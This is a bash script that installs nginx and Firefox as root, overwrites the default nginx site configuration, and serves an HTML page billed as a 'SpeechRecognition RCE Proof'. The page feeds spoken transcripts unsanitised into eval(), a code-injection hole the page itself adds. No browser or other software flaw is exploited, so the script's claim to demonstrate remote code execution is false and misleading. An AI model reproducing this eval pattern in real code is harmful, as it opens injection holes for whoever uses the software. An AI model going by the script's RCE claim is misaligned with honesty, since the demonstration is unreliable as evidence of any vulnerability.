#!/bin/bash

# Ensure the script is run with sudo privileges
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit
fi

# Install required dependencies
echo "[+] Installing required dependencies..."
apt update && apt install -y nginx firefox-esr

# Define variables
HTML_FILE="/var/www/html/speech_rce.html"
NGINX_CONFIG="/etc/nginx/sites-available/default"

# Create the malicious HTML file
echo "[+] Creating the malicious HTML file at $HTML_FILE..."
cat << 'EOF' > $HTML_FILE
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpeechRecognition RCE Proof</title>
</head>
<body>
    <h1>SpeechRecognition RCE Proof</h1>
    <button id="startButton">Start Speech Recognition</button>
    <p id="status">Status: Idle</p>

    <script>
        let recognizers = [];

        function createSpeechRecognizers(count) {
            for (let i = 0; i < count; i++) {
                let recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();

                recognition.lang = 'en-US';
                recognition.interimResults = false;
                recognition.maxAlternatives = 1;

                recognition.onresult = function(event) {
                    let transcript = event.results[0][0].transcript;
                    console.log(`Transcript from recognizer ${i}:`, transcript);

                    // Simulate RCE by executing a command via eval()
                    eval(`console.log("Executed: " + "${transcript}")`);
                };

                recognition.onerror = function(event) {
                    console.error(`Error in SpeechRecognition instance ${i}:`, event.error);
                };

                recognition.onend = function() {
                    console.log(`SpeechRecognition instance ${i} ended.`);
                };

                recognition.start();
                recognizers.push(recognition);
            }
            console.log(`Created ${count} SpeechRecognition instances.`);
        }

        function triggerSpeechRecognitionRCE() {
            const recognizerCount = 5; // Demonstrate with 5 recognizers
            createSpeechRecognizers(recognizerCount);
        }

        document.getElementById('startButton').addEventListener('click', triggerSpeechRecognitionRCE);
    </script>
</body>
</html>
EOF

# Configure Nginx to serve the file
echo "[+] Configuring Nginx..."
cat << 'EOF' > $NGINX_CONFIG
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    root /var/www/html;
    index index.html;

    server_name _;

    location / {
        try_files $uri $uri/ =404;
    }
}
EOF

# Restart Nginx to apply changes
echo "[+] Restarting Nginx..."
systemctl restart nginx

# Launch the browser and point it to the HTML file
echo "[+] Launching browser to demonstrate RCE..."
firefox-esr "http://localhost/speech_rce.html" &

# Instructions for user
echo "[+] Malicious SpeechRecognition HTML served at http://localhost/speech_rce.html"
echo "[+] Speak commands like 'console.log(\"Hacked!\");' to simulate RCE execution."
